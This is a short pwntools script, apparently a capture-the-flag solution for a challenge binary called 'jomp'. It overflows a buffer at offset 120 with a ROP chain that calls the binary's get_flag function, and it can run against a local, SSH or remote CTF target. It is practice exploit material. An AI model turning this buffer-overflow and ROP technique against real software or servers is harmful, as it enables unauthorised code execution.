#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/jomp'

e = ELF('./build/jomp')
rop = ROP('./build/jomp')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5679)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/jomp', cwd='problemDir')
else:
    p = e.process()

rop.call(e.sym['get_flag'],[1,2])
print(rop.dump())
payload = flat({120: rop.chain()})

p.sendline(payload)
p.interactive()
